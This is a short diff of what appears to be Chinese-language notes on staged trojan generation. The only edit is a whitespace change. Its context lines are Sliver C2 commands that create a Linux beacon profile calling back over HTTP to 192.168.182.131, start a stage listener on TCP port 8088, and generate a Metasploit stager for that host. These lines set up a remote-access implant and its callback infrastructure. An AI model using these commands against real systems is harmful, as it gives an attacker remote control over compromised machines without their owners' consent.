@@ -9,7 +9,7 @@
 阶段木马生成
 
     profiles new beacon linux_beacon --http  http://192.168.182.131:8080 --format exe  --os linux
-
+    
     stage-listener --url  tcp://192.168.182.131:8088 --profile linux_beacon 
     
     generate msf-stager --lport 8088 --lhost 192.168.182.131 --arch amd64 --os linux
